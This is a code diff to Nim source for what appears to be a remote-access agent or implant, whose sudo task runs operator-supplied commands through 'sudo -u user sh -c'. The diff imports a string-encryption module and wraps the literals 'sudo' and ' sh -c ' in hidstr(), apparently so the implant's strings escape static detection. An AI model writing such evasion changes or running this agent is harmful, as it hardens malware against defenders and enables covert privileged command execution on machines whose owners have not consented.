@@ -1,6 +1,7 @@
 import std/[json, osproc, os, strutils, envvars]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc sudoExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
@@ -17,7 +18,7 @@ proc sudoExecute(taskId: string, params: JsonNode, state: AgentState,
     if command.len == 0:
       return TaskResult(output: "Error: command is required", status: "error", completed: true)
 
-    let sudoBin = findExe("sudo")
+    let sudoBin = findExe(hidstr("sudo"))
     if sudoBin.len == 0:
       return TaskResult(output: "Error: sudo not found in PATH", status: "error", completed: true)
 
@@ -30,7 +31,7 @@ proc sudoExecute(taskId: string, params: JsonNode, state: AgentState,
     if user != "root":
       cmd &= " -u " & quoteShell(user)
 
-    cmd &= " sh -c " & quoteShell(command)
+    cmd &= hidstr(" sh -c ") & quoteShell(command)
 
     try:
       let (output, code) = execCmdEx(cmd, options = {poStdErrToStdOut},
@@ -41,4 +42,4 @@ proc sudoExecute(taskId: string, params: JsonNode, state: AgentState,
       return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initSudo*() =
-  register("sudo", sudoExecute)
+  register(hidstr("sudo"), sudoExecute)
